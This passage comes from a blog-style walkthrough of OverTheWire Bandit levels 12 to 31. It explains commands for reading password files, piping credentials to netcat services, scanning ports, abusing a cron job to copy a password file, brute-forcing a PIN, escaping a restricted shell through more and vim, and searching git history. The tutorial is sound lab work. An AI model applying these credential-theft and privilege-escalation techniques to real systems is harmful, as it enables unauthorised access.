file to process: $filename\u0026#34; ;; *\u0026#34;ASCII text\u0026#34;*) echo \u0026#34;[*] Found ASCII text file. Contents:\u0026#34; echo \u0026#34;---------------------------------------------------\u0026#34; cat \u0026#34;$filename\u0026#34; echo \u0026#34;---------------------------------------------------\u0026#34; echo \u0026#34;[*] Done.\u0026#34; break ;; *) echo \u0026#34;[!] Unsupported or unknown file type: $filetype\u0026#34; echo \u0026#34;[!] Exiting.\u0026#34; exit 1 ;; esac done Breakdown of the script.\n🔧 Header and Safety Settings\n#!/bin/bash set -euo pipefail #!/bin/bash: Specifies that the script should be run using Bash. set -euo pipefail: Enables strict error handling: e: Exit immediately if any command fails. u: Treat unset variables as errors. o pipefail: Ensures that failures in pipelines are caught. 🔍 Check for Required Tools\nfor cmd in file xxd gunzip bunzip2 tar xzcat xz; do if ! command -v \u0026#34;$cmd\u0026#34; \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;Error: required command \u0026#39;$cmd\u0026#39; not found.\u0026#34; exit 1 fi done Loops through a list of required tools. Exits early with a clear error if any command is missing. 🗂️ Setup Working Variables and Cleanup\nWORKDIR=$(pwd) filename=\u0026#34;data.bin\u0026#34; WORKDIR: Stores the current directory path. filename: The main input file that will be processed repeatedly. function cleanup { : } trap cleanup EXIT Placeholder cleanup function. trap cleanup EXIT: Calls cleanup when the script exits (could be used to remove temporary files). 🔁 Main Processing Loop\nwhile true; do This is an infinite loop that keeps processing the file data.bin (and its descendants) until the script identifies an ASCII text file (likely the final password).\n📂 Check File and Detect Type\nif [[ ! -f \u0026#34;$filename\u0026#34; ]]; then echo \u0026#34;Error: file \u0026#39;$filename\u0026#39; not found.\u0026#34; exit 1 fi filetype=$(file -b \u0026#34;$filename\u0026#34;) echo \u0026#34;[*] Current file ($filename) type: $filetype\u0026#34; Ensures the file exists. Uses the file command to detect the file type (e.g., gzip, tar, ASCII text). 📦 Handle Each Compression Type\nGzip *\u0026#34;gzip compressed data\u0026#34;*) ... Renames data.bin to something like data_1717512345.gz (timestamped). Unzips it using gunzip. Updates filename to the result. Bzip2 *\u0026#34;bzip2 compressed data\u0026#34;*) ... Same logic as gzip but with .bz2 and bunzip2. XZ Compression *\u0026#34;XZ compressed data\u0026#34;*) ... Handles .xz compressed files using unxz. Tar Archive *\u0026#34;POSIX tar archive\u0026#34;*) ... Detects tar archive. Moves it to a timestamped .tar file. Extracts contents into a new folder (extracted_\u0026lt;filename\u0026gt;). Finds the largest extracted file (likely the next compression layer). Sets that as the new filename. ASCII Text File (End Goal) *\u0026#34;ASCII text\u0026#34;*) ... When a plain text file is finally detected: Displays the file content (usually the password). Exits the loop and the script. ❌ Fallback for Unknown File Types\n*) echo \u0026#34;[!] Unsupported or unknown file type: $filetype\u0026#34; exit 1 ;; Catches all other file types not handled explicitly and exits. The script is to be copied in the temporary directory where the binary file is stored then executed from there.\nTo make the file executable you save as .sh then convert it to an executable by chmod +x \u0026lt;name\u0026gt;.sh\nbandit level 13-14 # In this level, we are provided with a private ssh key that we are required to use to log in to the use bandit14 from our ssh session of bandit13 in order to be able to read the password for user bandit14 that is stored on the location /etc/bandit_pass/bandit14.\nBelow is the command we use to log in to bandit14 from our server as shown below.\nbandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost -p 2220 ssh - Starts the Secure Shell (SSH) client. Used to connect to remote servers. -i sshkey.private Tells SSH to use the identity file (private key) sshkey.private for authentication. This file was provided in the level. bandit14@localhost Specifies the user (bandit14) and host (localhost) to connect to. localhost means \u0026#34;this machine\u0026#34; (i.e., you\u0026#39;re logging into the same server you\u0026#39;re already on, but as a different user). -p 2220 Instructs SSH to connect using port 2220 instead of the default port 22. This is important for Bandit, since all levels use port 2220. With that, we are now logged in to bandit14 user, and we can now get the password for the user stored in the location /etc/badnit_pass/bandit14\nbandit level 14-15 # In this level we are required to submit the password for user badnit14 to localhost on port3000 in order to find the password for the next level that is abndit15.\nBelow is the command we shall use to submit the password and get the password for bandit15\nbandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000 Correct! [REDACTED] cat /etc/bandit_pass/bandit14 reads your current level\u0026#39;s password. | pipes it as input into… nc localhost 30000 which sends it to port 30000 on the local machine. bandit level 15-16 # In this level, we are required to submit the password for the current level using SSL encryption on port 30001 in order to get the password for the next level bandit16. Below is the command we shall use to get the password.\nbandit15@bandit:~$ cat /etc/bandit_pass/bandit15 | ncat --ssl localhost 30001 Correct! [REDACTED] cat /etc/bandit_pass/bandit15 Purpose: Reads the contents of the file that holds the current level\u0026#39;s password (for bandit15). This password is needed to authenticate and retrieve the next level’s password. | The pipe (|) takes the output of the cat command (the password) and sends it as input to the next command (ncat). ncat --ssl localhost 30001 ncat: A modern version of netcat (from the Nmap project). It allows data to be sent or received over the network. --ssl: Enables SSL/TLS encryption for secure communication. localhost: Refers to the current machine (i.e., you\u0026#39;re connecting to a service running locally). 30001: The port number on localhost that is listening for incoming SSL connections. bandit level 16-17 # For this section, we are required to do the same steps as the initial level, however, we are required to first scan for open ports that has the server running.\nbandit16@bandit:~$ nmap localhost -p 31000-32000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 08:44 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00018s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE 31046/tcp open unknown 31518/tcp open unknown 31691/tcp open unknown 31790/tcp open unknown 31960/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds As seen above we have few ports running, however to get more accurate details, we shall try to do an aggressive scan -A to get more clear details as shown below.\nbandit16@bandit:~$ nmap localhost -A -p 31000-32000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 08:48 UTC Nmap scan report for localhost (127.0.0.1) Host is up (0.00011s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 31046/tcp open echo 31518/tcp open ssl/echo |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=SnakeOil | Not valid before: 2024-06-10T03:59:50 |_Not valid after: 2034-06-08T03:59:50 31691/tcp open echo 31790/tcp open ssl/unknown | ssl-cert: Subject: commonName=SnakeOil | Not valid before: 2024-06-10T03:59:50 |_Not valid after: 2034-06-08T03:59:50 |_ssl-date: TLS randomness does not represent time | fingerprint-strings: | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: |_ Wrong! Please enter the correct current password. 31960/tcp open echo 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port31790-TCP:V=7.94SVN%T=SSL%I=7%D=6/4%Time=68400869%P=x86_64-pc-linux SF:-gnu%r(GenericLines,32,\u0026#34;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20 SF:current\\x20password\\.\\n\u0026#34;)%r(GetRequest,32,\u0026#34;Wrong!\\x20Please\\x20enter\\x2 SF:0the\\x20correct\\x20current\\x20password\\.\\n\u0026#34;)%r(HTTPOptions,32,\u0026#34;Wrong!\\x SF:20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\.\\n\u0026#34;)%r(RTSP SF:Request,32,\u0026#34;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20p SF:assword\\.\\n\u0026#34;)%r(Help,32,\u0026#34;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x2 SF:0current\\x20password\\.\\n\u0026#34;)%r(FourOhFourRequest,32,\u0026#34;Wrong!\\x20Please\\x20 SF:enter\\x20the\\x20correct\\x20current\\x20password\\.\\n\u0026#34;)%r(LPDString,32,\u0026#34;Wr SF:ong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current\\x20password\\.\\n\u0026#34;)% SF:r(SIPOptions,32,\u0026#34;Wrong!\\x20Please\\x20enter\\x20the\\x20correct\\x20current SF:\\x20password\\.\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 161.57 seconds Now we have more details, we have SSL service running on port 31790, when we pass the creds for bandit16 to this service, we are provided with a private ssh key as shown below.\nbandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | ncat --ssl localhost 31790 Correct! -----BEGIN RSA PRIVATE KEY----- [REDACTED] -----END RSA PRIVATE KEY----- We can use this key to log in to bandit level 17 in our local machine but first we are required to change the file permission as shown below.\nchmod 400 key where 4 = owner can read 0 = group has no permission 0 = others have no permission Then we can log in to level 17 by using the commands below.\nssh -i key bandit17@bandit.labs.overthewire.org -p 2220 With that, we then access the password for bandit 17 at /etc/bandit_pass/badnit17\nbandit level 17-18 # For this section, we are required to use the command diff in order to find the string that is different in order to find the password for level 18. Below is the command used to check the difference.\nbandit17@bandit:~$ diff passwords.old passwords.new 42c42 \u0026lt; [REDACTED] --- \u0026gt; [REDACTED] breakdown diff: A Linux command that compares files and outputs the lines that differ. passwords.old: The first file, presumably containing older password data. passwords.new: The second file, presumably containing updated password data. bandit level 18-19 # For this section we are required to log in as user bandit18, however the .bashrc has been modified in such a manner that we get logged out when we try to log in as user bandit18 using ssh as shown below.\nLooking at the man pages for ssh, we can use the -t flag that will allow us to set a terminal that we can use to get the password for level 19 as shown below.\n-t Force pseudo-terminal allocation. This can be used to execute arbitrary screen-based programs on a remote ma‐ chine, which can be very useful, e.g. when implementing menu services. Multiple -t options force tty allocation, even if ssh has no local tty. To log in to the level 18 we shall use the following command\nssh -t bandit18@bandit.labs.overthewire.org -p 2220 /bin/sh breakdown ssh: This is the Secure Shell command, used to remotely log into another machine over the network. -t: This forces pseudo-terminal allocation. It allows you to run commands that require a terminal (like interactive shells). Even if a command is given directly (like /bin/sh), -t ensures it gets a proper terminal session. bandit18@bandit.labs.overthewire.org: bandit18 — the username you\u0026#39;re logging in with. bandit.labs.overthewire.org — the host/domain of the remote server. -p 2220: Specifies the port number for SSH, which is 2220 (instead of the default 22). /bin/sh: This is the command to run once you\u0026#39;re logged in — it directly invokes the sh shell on the remote system. After getting access as user bandit18, we can now be able to access the password stored on the file readme\nbandit level 19-20 # For this section, we are required to use the binary bandit20-do to get the password for the next level, but first we shall execute it without any arguments to see the syntax to execute the binary with commands as shown below.\nbandit19@bandit:~$ ls bandit20-do bandit19@bandit:~$ ./bandit20-do Run a command as another user. Example: ./bandit20-do id bandit19@bandit:~$ As seen above we can be able to execute the binary with commands following it as shown below, however, our password for user bandit20 is located at /etc/bandit_pass/bandit20\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20 [READCTED] bandit19@bandit:~$ bandit level 20-21 # For this section, we shall use two terminals for us to be able to get the password for the next level. The first terminal we shall pass the password for bandit20 on a certain port and then listen on the port using the binary on another terminal as shown below.\n#Terminal 1 pass the password for bandit20 through port \u0026lt;port of your choice\u0026gt; bandit20@bandit:~$ nc -lp 31337 \u0026lt; /etc/bandit_pass/bandit20 [next level password as output] #Terminal 2 listen on the port where th epassword has been passed from bandit20@bandit:~$ ./suconnect 31337 Read: [Initial password level passed and read] Password matches, sending next password bandit level 21-22 # For this section, we are told a program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.\nWe can check to know what command is executed as shown below.\nbandit21@bandit:~$ ls -la /etc/cron.d total 48 drwxr-xr-x 2 root root 4096 Apr 10 14:24 . drwxr-xr-x 121 root root 12288 Apr 21 12:42 .. -rw-r--r-- 1 root root 123 Apr 10 14:16 clean_tmp -rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 10 14:23 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit24 -rw-r--r-- 1 root root 201 Apr 8 2024 e2scrub_all -rwx------ 1 root root 52 Apr 10 14:24 otw-tmp-dir -rw-r--r-- 1 root root 102 Mar 31 2024 .placeholder -rw-r--r-- 1 root root 396 Jan 9 2024 sysstat bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit22 /usr/bin/cronjob_bandit22.sh \u0026amp;\u0026gt; /dev/null bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh #!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u0026gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv [REDACTED] As seen above, the command that is executed is as explained below.\n#!/bin/bash chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv cat /etc/bandit_pass/bandit22 \u0026gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv #!/bin/bash Breakdown This is a shebang line. It tells the system to execute the script using the Bash shell (/bin/bash). chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv chmod 644 sets the file permissions on the given file. 6 = read + write for owner 4 = read-only for group 4 = read-only for others So, the file becomes world-readable, which means any user on the system can read it. cat /etc/bandit_pass/bandit22 \u0026gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv This uses cat to read the contents of the password file for bandit22. The output is redirected (\u0026gt;) into the temporary file /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv. bandit level 22-23 # This section is the same as the previous one, where we are required to look at the cronjob and see what command is being executed. Furthermore, for this section there is no command but a bash script as shown below.\nbandit22@bandit:~$ ls -la /etc/cron.d total 48 drwxr-xr-x 2 root root 4096 Apr 10 14:24 . drwxr-xr-x 121 root root 12288 Apr 21 12:42 .. -rw-r--r-- 1 root root 123 Apr 10 14:16 clean_tmp -rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit22 -rw-r--r-- 1 root root 122 Apr 10 14:23 cronjob_bandit23 -rw-r--r-- 1 root root 120 Apr 10 14:23 cronjob_bandit24 -rw-r--r-- 1 root root 201 Apr 8 2024 e2scrub_all -rwx------ 1 root root 52 Apr 10 14:24 otw-tmp-dir -rw-r--r-- 1 root root 102 Mar 31 2024 .placeholder -rw-r--r-- 1 root root 396 Jan 9 2024 sysstat bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 @reboot bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null * * * * * bandit23 /usr/bin/cronjob_bandit23.sh \u0026amp;\u0026gt; /dev/null bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh #!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget Below is a breakdown of what the script is doing\n#!/bin/bash myname=$(whoami) mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget Breakdown 🔍 Line-by-Line Explanation #!/bin/bash The shebang line — tells the system to use the Bash shell to interpret the script. myname=$(whoami) Runs the whoami command to get the current username, and saves it in the variable myname. mytarget=$(echo I am user $myname | md5sum | cut -d \u0026#39; \u0026#39; -f 1) This line creates a hashed target filename: echo I am user $myname: creates the string I am user banditXX (if you\u0026#39;re bandit20, it\u0026#39;ll say I am user bandit20) | md5sum: pipes that string into md5sum, producing a hash | cut -d \u0026#39; \u0026#39; -f 1: trims the output to only the hash (since md5sum outputs both the hash and a dash -) Result: You now have a unique hash value stored in mytarget, which will be used as a filename. echo \u0026#34;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget\u0026#34; Just prints a message like: Copying passwordfile /etc/bandit_pass/bandit20 to /tmp/94f93cbfe0e106a7e6bffa548f2d8a4d cat /etc/bandit_pass/$myname \u0026gt; /tmp/$mytarget Uses cat to read the contents of the password file for the current user (/etc/bandit_pass/bandit20 if you\u0026#39;re bandit20). Redirects (\u0026gt;) that output to the /tmp folder under the hashed filename. With that, we can simply get the password by doing the following.\nbandit22@bandit:~$ echo \u0026#34;I am user bandit23\u0026#34; | md5sum 8ca319486bfbbc3663ea0fbe81326349 - bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349 [REDACTED] What we have simply done is echo I am user bandit23 and hashed it using md5sum, then concatenated the contents of the password stored in the tmp directory with md5 hash value.\nbandit level 23-24 # This level is similar to the previous one, however the script executed is different this time, as seen below.\nbandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh #!/bin/bash myname=$(whoami) cd /var/spool/$myname/foo echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; for i in * .*; do if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; then echo \u0026#34;Handling $i\u0026#34; owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then timeout -s 9 60 ./$i fi rm -f ./$i fi done Below is a break-down of the script\nThis Bash script is designed to execute and delete all scripts in a directory, with some checks for file ownership and a timeout. It’s likely part of a challenge like Bandit Level 24 → 25, where your script is automatically executed if you drop it in the right place with the right ownership. 🔍 Full Breakdown #!/bin/bash The shebang tells the system to use Bash to run the script. myname=$(whoami) Stores the current username in the variable myname. cd /var/spool/$myname/foo Changes the current working directory to /var/spool/\u0026lt;username\u0026gt;/foo. For example, if whoami is bandit24, this becomes /var/spool/bandit24/foo. echo \u0026#34;Executing and deleting all scripts in /var/spool/$myname/foo:\u0026#34; Just a status message to indicate what the script is doing. 🔁 Loop for i in * .*; Iterates over all files, including hidden ones (.*). Typical globbing (*) misses dotfiles (like .my_script), so both patterns are used to catch everything. if [ \u0026#34;$i\u0026#34; != \u0026#34;.\u0026#34; -a \u0026#34;$i\u0026#34; != \u0026#34;..\u0026#34; ]; Skips the special entries . (current directory) and .. (parent directory), which would break the script if processed. echo \u0026#34;Handling $i\u0026#34; Prints the filename being processed. owner=\u0026#34;$(stat --format \u0026#34;%U\u0026#34; ./$i)\u0026#34; Uses stat to get the owner of the file (%U is the user name), and stores it in owner. if [ \u0026#34;${owner}\u0026#34; = \u0026#34;bandit23\u0026#34; ]; then timeout -s 9 60 ./$i fi If the file is owned by bandit23, the script: Runs the file using timeout: -s 9: sends SIGKILL (signal 9) if it runs too long. 60: gives it 60 seconds max to run. Prevents scripts from hanging or consuming too many resources. rm -f ./$i Deletes the script file after executing (regardless of ownership or execution success). So this requires us to create our own shell script to pass this level, however we shall use some trick, we will create the variable myname and assign the value bandit24 as shown below.\nbandit23@bandit:~$ myname=bandit24 bandit23@bandit:~$ $myname bandit24: command not found bandit23@bandit:~$ After creating the variable we shall then create a tmp adirectory where the password will be stored for us to be able to reach it by setting the directory permissions for everyone to be able to read, write and execute it as shown below\nbandit23@bandit:~$ mkdir /tmp/victor bandit23@bandit:~$ chmod 777 /tmp/victor bandit23@bandit:~$ After that we shall then switch to the spool directory of bandit user bandit24 using the variable we created as shown below.\nbandit23@bandit:~$ cd /var/spool/$myname bandit23@bandit:/var/spool/bandit24$ ls foo bandit23@bandit:/var/spool/bandit24$ cd foo bandit23@bandit:/var/spool/bandit24/foo$ After that we create our script inside here and change its permissions to an executable in order for us to get the password stored in our temporary directory. The contents of our script will be as follows\n#!/usr/bin/bash cat /etc/bandit_pass/bandit24 \u0026gt; /tmp/victor/pass.txt Below is the file setup.\nbandit23@bandit:/var/spool/bandit24/foo$ nano get.sh Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory It is required for saving/loading search history or cursor positions. bandit23@bandit:/var/spool/bandit24/foo$ chmod +x get.sh bandit23@bandit:/var/spool/bandit24/foo$ We then wait for a minute, then see what is stored in our temporary directory.\nbandit23@bandit:/var/spool/bandit24/foo$ ls /tmp/victor pass.txt bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/victor/pass.txt [REDACTED] We now have the password for the next level.\nbandit level 24-25 # From the description of the challenge, it seems we shall be creating a simple bash script that will loop through a 10000 4-pin digit in combination with the bandit24 pass in order to get the password for the next level.\nBelow is the script to our problem.\n#!/usr/bin/env bash # Shebang line tells the system to use the Bash shell via the env command (more portable than /bin/bash) # Loop through numbers 0000 to 9999 (4-digit PINs, zero-padded) for i in $(seq -w 0 9999); do #The seq command in Linux/Unix is used to generate a sequence of numbers # For each PIN, print the password followed by the current PIN (e.g., \u0026#34;password 0001\u0026#34;) echo \u0026#34;[redacted] $i\u0026#34; done | nc localhost 30002 # Send all generated lines to the daemon listening on port 30002 using netcat (nc) # This avoids reconnecting for each PIN attempt — the daemon stays connected for the whole brute-force process bandit level 25-26 # For this challenge, we are provided with the private key for the bandit user 26 that we can use to log in to the user’s session, however, the shell is not /bin/bash shell. We can check which type of shell it is by looking at the /etc/passwd file, as shown below.\nbandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext =\u0026gt; for this user the shell is of type /usr/bin/showtext bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash We can check to find this is what type of shell as shown below\nbandit25@bandit:~$ cat /usr/bin/showtext #!/bin/sh export TERM=linux exec more ~/text.txt exit 0 As seen above, this is a simple shell script that utilizes the more command. Looking at the man page of the more command, we get some interesting commands we can use as shown below.\n= Display current line number. /pattern Search for kth occurrence of regular expression. Defaults to 1. n Search for kth occurrence of last regular expression. Defaults to 1. !command or :!command Execute command in a subshell. v Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is not defined, or defaults to vi(1) if neither VISUAL nor EDITOR is defined. For us to activate the more command, we shall reduce the terminal size in order to be able to activate it by increasing the size of the terminal output by pressing the button ctrl + +as shown below.\nAbove is the initial terminal size.\nAbove the size of the terminal after increasing the terminal output size.\nAfter getting the terminal to that size, we can then try to press the v button to get a text editor, in our case we get the vim editor. We can access the password for the level 26 by using the :e which in vim means edit letter then followed by the password file as shown below\nAfter entering the above command then pressing enter, we get the password for level 26.\nbandit level 26-27 # For this level, we shall use the terminal we got in the previous section.\nHere we shall set the shell to be /bin/bash as shown below.\nTo access the bash shell, we can now just type :shell, and we get our bash shell, but I want to explore the vi editor hence, to execute commands, we shall use the prefix shown below.\nIn vi editor, the prefix :! is used in the execution of external shell commands, as seen above.\nMoreover, the binary file bandit27-do performs the same task as the one in bandit level 19, therefore, we shall use it to get the password for bandit level 27.\nbandit level 27-28 # For this level, we shall be using git. This part is quite easy as we are required to clone the repo and be able to access the password for the next level. We shall do this in a temporary directory.\nBelow is the command we shall use, after the command you will be prompted for a password, we shall use the password for the user bandit27 as we are told on the webpage.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git clone ssh://bandit27-git@localhost/home/bandit27-git/repo Below is the breakdown of what the command does.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; This sets an environment variable for the Git command. It tells Git: \u0026#34;When using SSH to connect, use the command ssh -p 2220 instead of the default SSH (which uses port 22).\u0026#34; This is important because the Bandit SSH server listens on port 2220, not 22. git clone ssh://bandit27-git@localhost/home/bandit27-git/repo This tells Git to clone a repository using the SSH protocol. bandit27-git@localhost means: Connect as user bandit27-git to the local machine (because you\u0026#39;re already on the Bandit server). /home/bandit27-git/repo is the path to the Git repository on the server. So what happens together? Git uses the custom SSH command (ssh -p 2220) to: Connect to localhost on port 2220 Authenticate as bandit27-git Clone the Git repo from /home/bandit27-git/repo The password is located in a README file inside the cloned repo.\nbandit level 28-29 # For this level, we shall use the same tactics as in the previous level to get the password for the next level.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git clone ssh://bandit28-git@localhost/home/bandit28-git/repo However, looking at the contents of the README file, we do not have the password for the level as seen below.\nbandit28@bandit:/tmp/28o/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: xxxxxxxxxx Looking at the logs of the branch, we get some interesting commit message as shown below.\nbandit28@bandit:/tmp/28o/repo$ git log commit 674690a00a0056ab96048f7317b9ec20c057c06b (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 fix info leak commit fb0df1358b1ff146f581651a84bae622353a71c0 Author: Morla Porla \u0026lt;morla@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 add missing data commit a5fdc97aae2c6f0e6c1e722877a100f24bcaaa46 Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:19 2025 +0000 initial commit of README.md We shall check out to the branch fb0df1358b1ff146f581651a84bae622353a71c0 and see which missing data was added.\nbandit28@bandit:/tmp/28o/repo$ git checkout fb0df1358b1ff146f581651a84bae622353a71c0 Note: switching to \u0026#39;fb0df1358b1ff146f581651a84bae622353a71c0\u0026#39;. You are in \u0026#39;detached HEAD\u0026#39; state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by switching back to a branch. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -c with the switch command. Example: git switch -c \u0026lt;new-branch-name\u0026gt; Or undo this operation with: git switch - Turn off this advice by setting config variable advice.detachedHead to false HEAD is now at fb0df13 add missing data bandit28@bandit:/tmp/28o/repo$ git status HEAD detached at fb0df13 nothing to commit, working tree clean bandit28@bandit:/tmp/28o/repo$ cat README.md # Bandit Notes Some notes for level29 of bandit. ## credentials - username: bandit29 - password: [redacted] After switching to the commit and checking the README file, we get the password for level 29.\nbandit level 29-30 # We shall clone the repo using the same syntax as the previous levels.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git clone ssh://bandit29-git@localhost/home/bandit29-git/repo After cloning the repo and checking at the logs, we find the following details.\ncommit 3b8b91fc3c48f1a19d05670fd45d3e3f2621fcfa (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:21 2025 +0000 fix username commit 8d2ffeb5e45f87d0abb028aa796e3ebb63c5579c Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:21 2025 +0000 initial commit of README.md Switching to the initial commit, the username was changed from 29 to 30 and the fix username commit was used to switch the username from 29 to 30.\nWe shall explore the remote branches and see if we will find some interesting branches as shown below.\nbandit29@bandit:/tmp/30a/repo$ git branch -r origin/HEAD -\u0026gt; origin/master origin/dev origin/master origin/sploits-dev We have some interesting dev branches, we can explore and see if we can find credentials for user bandit30.\nLet\u0026rsquo;s switch to the dev branch and see what contents are there.\nbandit29@bandit:/tmp/30a/repo/code$ cd .. bandit29@bandit:/tmp/30a/repo$ ls code README.md bandit29@bandit:/tmp/30a/repo$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: [REDACTED] We have creds for user bandit30.\nbandit level 30-31 # after cloning the repo, we shall explore it to see what details we shall get.\nGIT_SSH_COMMAND=\u0026#34;ssh -p 2220\u0026#34; git clone ssh://bandit30-git@localhost/home/bandit30-git/repo We only have one commit in the repo, as shown below.\nbandit30@bandit:/tmp/31a/repo$ git log commit fb05775f973256dc6d8d5bb6a8e6b96b0d8795c8 (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:24 2025 +0000 initial commit of README.md We have two branches as seen below.\nbandit30@bandit:/tmp/31a/repo$ git branch -r origin/HEAD -\u0026gt; origin/master origin/master Switching between the branches, we get no useful details on the README file but just the following text.\nbandit30@bandit:/tmp/31a/repo$ cat README.md just an epmty file... muahaha We can use the command git show to display detailed information about the commit, and git tag to view if we can find some interesting labels used to mark specific commits.\nbandit30@bandit:/tmp/31a/repo$ git show commit fb05775f973256dc6d8d5bb6a8e6b96b0d8795c8 (HEAD -\u0026gt; master, origin/master, origin/HEAD) Author: Ben Dover \u0026lt;noone@overthewire.org\u0026gt; Date: Thu Apr 10 14:23:24 2025 +0000 initial commit of README.md diff --git a/README.md b/README.md new file mode 100644 index 0000000..029ba42 --- /dev/null +++ b/README.md @@ -0,0 +1 @@ +just an epmty file... muahaha bandit30@bandit:/tmp/31a/repo$ git tag secret bandit30@bandit:/tmp/31a/repo$ As seen above, the git tag command has some interesting tag secret , we can use the git show command to view what the secret is as shown below.\nbandit30@bandit:/tmp/31a/repo$ git show secret [REDACTED] bandit30@bandit:/tmp/31a/repo$ The string that was displayed was the password for bandit31, that is after I tried to log in to the user using the string.\nbandit level 31-32 # For this challenge, we are required to push a file named key.txt to the remote server as indicated in the README file.\nbandit31@bandit:/tmp/32a/repo$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: \u0026#39;May I come in?\u0026#39; Branch: master Furthermore, we are also given the content to include in the file as May I come in?\nAfter creating the file and pushing it 